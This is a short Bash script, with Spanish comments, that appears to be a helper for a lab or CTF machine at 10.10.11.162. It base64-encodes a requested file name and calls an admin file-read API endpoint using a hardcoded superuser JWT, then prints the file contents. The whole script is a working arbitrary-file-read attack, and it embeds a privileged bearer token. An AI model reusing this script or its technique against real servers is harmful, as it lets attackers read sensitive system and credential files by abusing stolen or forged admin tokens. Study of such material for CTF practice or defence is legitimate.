#!/bin/bash
# Author: José Luis Íñigo
# website: Diseñowebensevilla.org
# Recordar poner permisos de ejecucion
# chmod +x getFile.sh
# sudo ./getFile.sh -h

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	#echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm
	exit 0
}

function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./getFile.sh${endColour}"
	echo -e "\n\t${purpleColour}f)${endColour}${yellowColour}file name${endColour}"
	echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

function getFilename(){
    filename="$1"    
    filename_base64="$(echo -n $1 | base64 -w 0)"
    
    curl -s -X GET "http://10.10.11.162/api/v1/admin/file/$filename_base64" -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Mjc3OTkzLCJpYXQiOjE2NTQ1ODY3OTMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllN2Y3ZDUtZjFkMy00NjM4LWEzNGQtNWU4MTUyNDU0ZjE0In0.hSsQU4-nxMGfCj2EdyuF7c_W5jIUeaON8-WdblCoKYg' | jq -r '.file'
    
    if [ "$?" == "0" ]; then
        echo -e "\n el nombre del archivo es: $filename\n"
    else
        echo "no se ha encontrado un valor válido"
    fi


}
# Main Function

if [ "$(id -u)" == "0" ]; then
    declare -i parameter_counter=0; while getopts ":f:h:" arg; do
    	case $arg in
    		f) filename=$OPTARG; let parameter_counter+=1 ;;
    	    h) helpPanel;;
    	esac
    done

    if [ $parameter_counter -ne 1 ]; then
    	helpPanel
    else
    	getFilename $filename
    fi
else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi